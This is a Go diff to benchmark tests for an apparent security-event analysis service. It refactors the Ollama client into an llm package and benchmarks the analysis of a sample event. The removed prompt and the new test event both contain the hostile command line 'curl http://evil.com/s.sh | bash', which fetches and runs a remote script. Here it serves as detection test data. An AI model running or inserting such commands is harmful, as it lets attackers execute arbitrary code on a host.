@@ -14,6 +14,7 @@ import (
 	"google.golang.org/grpc"
 	"google.golang.org/grpc/credentials/insecure"
 
+	"KernelHarbor/cmd/analysis/internal/llm"
 	pb "KernelHarbor/cmd/analysis/pb"
 )
 
@@ -212,7 +213,6 @@ func BenchmarkBatchProcessorThroughput(b *testing.B) {
 		MinBatchTimeout: 10 * time.Millisecond,
 	})
 
-	ollamaClient = nil
 	esClientInstance = nil
 
 	bp.Start()
@@ -258,7 +258,6 @@ func BenchmarkGrpcIngestThroughput(b *testing.B) {
 
 	client := pb.NewAgentServiceClient(conn)
 
-	ollamaClient = nil
 	esClientInstance = nil
 	autoAnalyzeByDefault = true
 
@@ -328,7 +327,6 @@ func BenchmarkGrpcIngestBatch(b *testing.B) {
 
 	client := pb.NewAgentServiceClient(conn)
 
-	ollamaClient = nil
 	esClientInstance = nil
 	autoAnalyzeByDefault = true
 
@@ -479,7 +477,7 @@ func BenchmarkOllamaEmbedding(b *testing.B) {
 		b.Skip("OLLAMA_ADDRESS not set, skipping Ollama embedding benchmark")
 	}
 
-	client := NewOllamaClient(OllamaConfig{
+	client := llm.NewOllama(llm.OllamaConfig{
 		Address:    ollamaAddr,
 		Model:      "qwen2.5:7b",
 		EmbedModel: "nomic-embed-text",
@@ -507,21 +505,40 @@ func BenchmarkOllamaGeneration(b *testing.B) {
 		b.Skip("OLLAMA_ADDRESS not set, skipping Ollama generation benchmark")
 	}
 
-	client := NewOllamaClient(OllamaConfig{
-		Address:  ollamaAddr,
-		Model:    "qwen2.5:7b",
-		EmbedDim: VectorDim,
+	backend := llm.NewOllama(llm.OllamaConfig{
+		Address: ollamaAddr,
+		Model:   "qwen2.5:7b",
 	})
 
-	ctx := context.Background()
-	prompt := `Analyze this security event: curl http://evil.com/s.sh | bash. Is this malicious? Answer in JSON format: {"verdict": "benign|suspicious|malicious", "confidence": 0.0-1.0, "summary": "brief explanation"}`
+	evt := Event{
+		EventType:   "execve",
+		CommandLine: "curl http://evil.com/s.sh | bash",
+	}
+	req := llm.AnalysisRequest{
+		Events:   []llm.EventLike{benchEventLike{evt}},
+		HostName: "bench-host",
+	}
 
 	b.ResetTimer()
 	b.ReportAllocs()
 	for i := 0; i < b.N; i++ {
-		_, err := client.Generate(ctx, prompt)
+		_, err := backend.Analyze(req)
 		if err != nil {
-			b.Fatalf("Generate failed: %v", err)
+			b.Fatalf("Analyze failed: %v", err)
 		}
 	}
 }
+
+type benchEventLike struct {
+	event Event
+}
+
+func (e benchEventLike) GetEventType() string   { return e.event.EventType }
+func (e benchEventLike) GetCommandLine() string { return e.event.CommandLine }
+func (e benchEventLike) GetImagePath() string   { return e.event.ImagePath }
+func (e benchEventLike) GetRemoteAddr() string  { return e.event.RemoteAddr }
+func (e benchEventLike) GetRemotePort() uint16  { return e.event.RemotePort }
+func (e benchEventLike) GetProcessID() uint32   { return e.event.ProcessID }
+func (e benchEventLike) GetParentGUID() string  { return e.event.ParentGUID }
+func (e benchEventLike) GetHostName() string    { return e.event.HostName }
+func (e benchEventLike) GetFilePath() string    { return e.event.FilePath }
